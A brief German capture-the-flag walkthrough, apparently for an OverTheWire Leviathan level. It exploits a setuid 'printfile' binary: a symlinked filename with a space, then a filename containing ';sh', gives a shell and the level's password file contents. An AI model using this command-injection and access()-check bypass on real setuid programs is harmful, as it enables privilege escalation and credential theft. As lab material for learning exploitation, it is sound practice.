printfile prüft den input mit access().
Falls das erfolgreich ist, wird system("/bin/cat ads") aufgerufen.

Das Problem ist dass access den gesamten pfad prüft und cat bei leerzeichen splittet (zumindest wenn man das so macht).

Das heißt wir generieren eine Datei mit leerzeichen auf die leviathan3 Zugriff hat und ein Teil davon ist ein link auf /etc/leviathan_pass/leviathan3

~/printfile "pass test"
Q0G8j4sakn
/bin/cat: test: No such file or directory

Viel bsser:

zwei commands mit ; aufrufen:

touch "test3;sh"
~/printfile "test3;sh" 

/bin/cat: test3: No such file or directory
$ whoami
leviathan3
$ cat /etc/leviathan_pass/leviathan3
Q0G8j4sakn
$ 